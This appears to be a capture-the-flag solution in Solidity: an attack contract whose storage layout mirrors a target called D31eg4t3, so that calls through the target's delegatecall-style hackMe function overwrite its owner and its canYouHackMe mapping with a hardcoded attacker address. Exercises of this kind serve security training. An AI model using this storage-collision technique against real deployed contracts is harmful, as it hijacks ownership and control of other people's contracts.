// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./D31eg4t3.sol";

contract AttackContract{
    uint a = 12345;
    uint8 b = 32;
    string private d; 
    uint32 private c; 
    string private mot;
    address public owner;
    mapping (address => bool) public canYouHackMe;

    D31eg4t3 public d31eg4t3;

    constructor(D31eg4t3 _d31eg4t3) {
        d31eg4t3 = _d31eg4t3;
    }

    function updateOwner() public {
        // Didn't find a way to represent hacker's address, so hardcoding it
        owner = 0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE;
    }

    function updateMapping() public {
        canYouHackMe[0xa63c492D8E9eDE5476CA377797Fe1dC90eEAE7fE] = true;
    }

    function pwn() public {
        (bool r1, bytes memory msge1) = d31eg4t3.hackMe(abi.encodeWithSignature("updateOwner()"));
        console.log("r1: ", r1);
        console.logBytes(msge1);
        (bool r2, bytes memory msge2) = d31eg4t3.hackMe(abi.encodeWithSignature("updateMapping()"));
        console.log("r2: ", r2);
        console.logBytes(msge2);
    }
}